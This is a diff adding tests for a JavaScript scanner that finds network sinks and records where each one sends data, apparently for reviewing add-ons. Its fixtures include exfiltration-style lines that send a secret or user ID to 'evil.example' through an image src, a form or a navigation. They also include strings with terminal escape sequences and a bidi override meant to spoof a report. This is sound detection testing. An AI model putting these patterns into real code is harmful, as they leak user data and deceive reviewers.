@@ -10,6 +10,7 @@ import { URL_CLASS, OVERTNESS } from "../../src/lib/enum.js";
 import assert from "node:assert/strict";
 
 import { scanNetworkSinks } from "../../src/parse/network-sinks.js";
+import { srcText } from "../../src/parse/ast.js";
 
 const one = (code) => scanNetworkSinks(code).hits[0];
 
@@ -420,4 +421,94 @@ test("a location.href navigation carrying a data-API call is covert and data-bea
   const plain = one('location.href = "https://evil.example.com/u/" + userId;');
   assert.equal(plain.type, "navigation");
   assert.equal(plain.carriesData, false);
+});
+
+// Each sink records the destination AS WRITTEN, so a report can say where the data
+// goes without the reviewer opening the file. Nothing is resolved: an identifier or
+// a concatenation is quoted exactly as the developer typed it, because what was
+// typed is the evidence. Every channel reaches its destination through one place in
+// the scanner, so all of them carry it.
+test("a sink records the destination expression as written", () => {
+  const target = (code) => one(code).target;
+  assert.equal(
+    target('fetch("https://api.example.com/collect");'),
+    '"https://api.example.com/collect"'
+  );
+  assert.equal(target("fetch(endpoint);"), "endpoint");
+  assert.equal(target('fetch(base + "/collect");'), 'base + "/collect"');
+  assert.equal(
+    target('navigator.sendBeacon("https://x.example/b", d);'),
+    '"https://x.example/b"'
+  );
+  assert.equal(
+    target('const x = new XMLHttpRequest(); x.open("POST", url);'),
+    "url"
+  );
+  assert.equal(target("new WebSocket(`wss://${h}/s`);"), "`wss://${h}/s`");
+  assert.equal(
+    target('new EventSource("https://x.example/e");'),
+    '"https://x.example/e"'
+  );
+  assert.equal(target("window.open(u);"), "u");
+  assert.equal(
+    target('img.src = "https://evil.example/?d=" + secret;'),
+    '"https://evil.example/?d=" + secret'
+  );
+  // A form submits to the action set earlier, which is the destination even though
+  // it was written on another line.
+  assert.equal(
+    target(
+      'const f = document.createElement("form");\nf.action = "https://evil.example/c";\nf.submit();'
+    ),
+    '"https://evil.example/c"'
+  );
+});
+
+// A destination spanning lines still has to fit one locus line, and a sink that
+// names no destination at all has none to report.
+test("a destination is collapsed to one line, or absent", () => {
+  assert.equal(
+    one(
+      'fetch(\n  cond\n    ? "https://a.example/x"\n    : "https://b.example/y"\n);'
+    ).target,
+    'cond ? "https://a.example/x" : "https://b.example/y"'
+  );
+  assert.equal(one("fetch();").target, null);
+  assert.equal(one("window.open();").target, null);
+  assert.equal(
+    one('const x = new XMLHttpRequest(); x.open("GET");').target,
+    null
+  );
+});
+
+// srcText reads a node's own source by its offsets, so a node carrying none - hand
+// built, or recovered from a parse error - must report nothing. Slicing undefined
+// bounds would hand back the ENTIRE file, which would then be quoted into a report
+// as if it were one destination.
+test("srcText yields nothing for a node with no offsets", () => {
+  const code = "const secret = 1;\nfetch(secret);";
+  assert.equal(srcText({ type: "Identifier", name: "x" }, code), null);
+  assert.equal(srcText(null, code), null);
+  assert.equal(srcText(undefined, code), null);
+  assert.equal(srcText({ start: 0, end: 5 }, code), "const");
+  // Whitespace only, and a missing source, are absent rather than empty.
+  assert.equal(srcText({ start: 5, end: 6 }, code), null);
+  assert.equal(srcText({ start: 0, end: 5 }, null), null);
+});
+
+// The destination is the add-on's own text landing in a report a human reads in a
+// terminal, so it arrives as plain visible characters. An escape sequence would let
+// a reviewed string repaint or erase the report around it, and a bidi override would
+// let it reorder what is shown.
+test("a destination cannot carry control or format characters into the report", () => {
+  const esc = String.fromCharCode(27);
+  const painted = one(
+    `fetch("http://b.example/${esc}[1A${esc}[2K erased", { body: d });`
+  ).target;
+  assert.ok(!/[\p{Cc}\p{Cf}]/u.test(painted), JSON.stringify(painted));
+  assert.match(painted, /b\.example/);
+  const reordered = one(
+    'fetch("http://c.example/\u202Egnp.exe", { body: d });'
+  ).target;
+  assert.ok(!/[\p{Cc}\p{Cf}]/u.test(reordered), JSON.stringify(reordered));
 });
